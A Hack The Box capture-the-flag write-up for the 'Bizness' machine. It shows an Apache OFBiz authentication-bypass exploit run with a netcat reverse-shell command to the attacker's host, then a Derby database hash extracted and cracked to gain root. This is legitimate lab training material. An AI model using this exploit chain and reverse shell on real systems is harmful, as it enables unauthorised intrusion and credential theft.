# Bizness | HTB
### Difficulty Level: Easy
------------------------------------------

add bizness.htb to your /etc/hosts file with:

```bash
echo '<machine-ip>    bizness.htb' >> /etc/hosts
```

Start with nmap scan to discover open ports and services:

```
└─# nmap -T4 10.10.11.252 -oN bizness.nmap
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-04 18:32 EDT
Nmap scan report for bizness.htb (10.10.11.252)
Host is up (0.096s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 2.66 seconds
```

-T4 - Increases the scan's speed.

-oN - saves the output to a file.

There are 3 open ports:

22 - ssh

80 - http

443 - https


browse into the webpage:

![image](https://cdn-images-1.medium.com/max/1000/1*RDiEx9XtlQ-oLb4J91FiNw.png)


gobuster didn't work and I got errors, so I decide to use another tool, dirsearch.

```bash

dirsearch -u https://bizness.htb

Target: https://bizness.htb/

[18:42:05] Starting:                                                                                                          
[18:42:22] 400 -  795B  - /\..\..\..\..\..\..\..\..\..\etc\passwd               
[18:42:24] 400 -  795B  - /a%5c.aspx                                        
[18:42:25] 302 -    0B  - /accounting  ->  https://bizness.htb/accounting/  
[18:42:57] 302 -    0B  - /catalog  ->  https://bizness.htb/catalog/        
[18:42:59] 302 -    0B  - /common  ->  https://bizness.htb/common/          
[18:42:59] 404 -  762B  - /common/                                          
[18:42:59] 404 -  780B  - /common/config/api.ini                            
[18:42:59] 404 -  779B  - /common/config/db.ini                             
[18:43:03] 302 -    0B  - /content  ->  https://bizness.htb/content/        
[18:43:03] 302 -    0B  - /content/debug.log  ->  https://bizness.htb/content/control/main
[18:43:03] 302 -    0B  - /content/  ->  https://bizness.htb/content/control/main
[18:43:04] 200 -   34KB - /control/                                         
[18:43:04] 200 -   34KB - /control
[18:43:04] 200 -   11KB - /control/login                                    
[18:43:09] 404 -  741B  - /default.jsp                                      
[18:43:09] 404 -  763B  - /default.html                                     
[18:43:14] 302 -    0B  - /error  ->  https://bizness.htb/error/            
[18:43:15] 404 -  761B  - /error/                                           
[18:43:15] 404 -  770B  - /error/error.log                                  
[18:43:15] 302 -    0B  - /example  ->  https://bizness.htb/example/        
[18:43:24] 302 -    0B  - /images  ->  https://bizness.htb/images/

```

There is an interesting path: /control/login 

 OFBiz Login page out there.

 ![image](https://cdn-images-1.medium.com/max/1000/1*Mz5kqCyzrCJEhqxO5UQuRQ.png)

 I tried to get in with default credentials but without any success.

So let's find an exploit for this service and the specified version. 


![image](https://cdn-images-1.medium.com/max/1000/1*C7BTmP6IdRsGEk40ZWtH-w.png)


After some searching in google I found an exploit:

https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass

So I used git clone to grab the repository.


```bash
└─# python3 exploit.py --url https://bizness.htb --cmd 'nc -c bash <tun-0> 4444'
[+] Generating payload...
[+] Payload generated successfully.
[+] Sending malicious serialized payload...
[+] The request has been successfully sent. Check the result of the command.
```

I run the exploit with a command to connect my machine with netcat.
then, create netcat listener to get the connection.

```bash
nc -lnvp 4444
```

and there is a shell.

```bash
└─# nc -lnvp 4444                          
listening on [any] 4444 ...
connect to [tun-0] from (UNKNOWN) [10.10.11.252] 38330
whoami
ofbiz
python3 -c 'import pty; pty.spawn("/bin/bash")'
ofbiz@bizness:/opt/ofbiz$
```

Grab user.txt flag.

```bash
ofbiz@bizness:~$ cat user.txt
cat user.txt
********************************
ofbiz@bizness:~$
```

##Privilege escalation##
-------------------------------------------

After long enumaration I found derby database:

```bash
ofbiz@bizness:/opt/ofbiz/runtime/data/derby/ofbiz$ ls
ls
dbex.lck  log                            seg0                tmp
db.lck    README_DO_NOT_TOUCH_FILES.txt  service.properties
ofbiz@bizness:/opt/ofbiz/runtime/data/derby/ofbiz$ cat README_DO_NOT_TOUCH_FILES.txt
<data/derby/ofbiz$ cat README_DO_NOT_TOUCH_FILES.txt

# *************************************************************************
# ***              DO NOT TOUCH FILES IN THIS DIRECTORY!                ***
# *** FILES IN THIS DIRECTORY AND SUBDIRECTORIES CONSTITUTE A DERBY     ***
# *** DATABASE, WHICH INCLUDES THE DATA (USER AND SYSTEM) AND THE       ***
# *** FILES NECESSARY FOR DATABASE RECOVERY.                            ***
# *** EDITING, ADDING, OR DELETING ANY OF THESE FILES MAY CAUSE DATA    ***
# *** CORRUPTION AND LEAVE THE DATABASE IN A NON-RECOVERABLE STATE.     ***
# *************************************************************************
```

moving into seg0 there are tones of .dat files, strings all the files and try to get passwords from it with:

```bash
<a/derby/ofbiz/seg0$ strings *.dat | grep "Password"    
                        <td align='left'><span>Password: </span></td>
                  <div><a href="<@ofbizUrl>/forgotpasswd</@ofbizUrl>">Forgot Password?</a></div>
        <Password>${password}</Password>
!Change Password Template Location
!Forget Password Template Location
Retrieve Password
                <eeval-UserLogin createdStamp="2023-12-16 03:40:23.643" createdTxStamp="2023-12-16 03:40:23.445" currentPassword="$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I" enabled="Y" hasLoggedOut="N" lastUpdatedStamp="2023-12-16 03:44:54.272" lastUpdatedTxStamp="2023-12-16 03:44:54.213" requirePasswordChange="N" userLoginId="admin"/>
Password
```

There is hash:

```
$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I
```

"SHA" indicates the hash algorithm used, which is SHA-1.
"d" denotes that it's a password hash generated with the crypt function.
"uP0_QaVBpDWFeo8-dRzDqRwXQ2I" is the actual hash value.

There are some hash sha1 cracker of ofbiz's hashes:

https://github.com/duck-sec/Apache-OFBiz-SHA1-Cracker.git

clone the repository and use cracker.

```bash
└─# python3 cracker.py --hash-string '$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I' --wordlist /usr/share/wordlists/rockyou.txt
[+] Attempting to crack....
Found Password: monkeybizness
hash: $SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I
(Attempts: 1478438)
[!] Super, I bet you could log into something with that!
```

There is a password for root. su root and grab root.txt flag.

```
ofbiz@bizness:/opt/ofbiz/runtime/data/derby/ofbiz/seg0$ su
su
Password: monkeybizness

root@bizness:/opt/ofbiz/runtime/data/derby/ofbiz/seg0# whoami
whoami
root
root@bizness:/opt/ofbiz/runtime/data/derby/ofbiz/seg0# cat /root/root.txt
cat /root/root.txt
********************************
root@bizness:/opt/ofbiz/runtime/data/derby/ofbiz/seg0# 
```

AND THIS IS THE END!

***Written by Alon Presman, Penetration Tester and Ethical Hacker.***






























 











